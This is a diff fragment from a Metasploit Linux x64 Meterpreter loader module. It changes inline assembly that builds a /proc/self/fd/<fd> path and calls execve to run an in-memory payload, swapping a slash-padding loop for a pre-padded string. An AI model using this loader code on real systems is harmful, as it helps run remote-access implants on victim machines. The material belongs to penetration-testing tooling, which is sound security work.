@@ -29,7 +29,7 @@ module Msf::Payload::Linux::X64::MeterpreterLoader
       mov rax, rdi
     itoa:
       test rax, rax
-      jz fixpath
+      jz execve
       mov rdx, 10
       div dl
       mov rdx, rax
@@ -39,22 +39,15 @@ module Msf::Payload::Linux::X64::MeterpreterLoader
       mov byte [rbx + rcx], dl
       dec rcx
       jmp itoa
-    fixpath:
-      cmp rcx, 13
-      je execve
-      mov byte [rbx + rcx], '/'
-      dec rcx
-      jmp fixpath
     execve:
       mov rdi, rbx
       xor rdx, rdx
       xor rsi, rsi
       mov eax, 0x3b
       syscall                           ; execve("/proc/self/fd/<fd>", NULL, NULL);
-
     get_command:
       call got_command
-      db "/proc/self/fd/", 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+      db "/proc/self/fd//////", 0x00
     get_payload:
       call got_payload
     ^
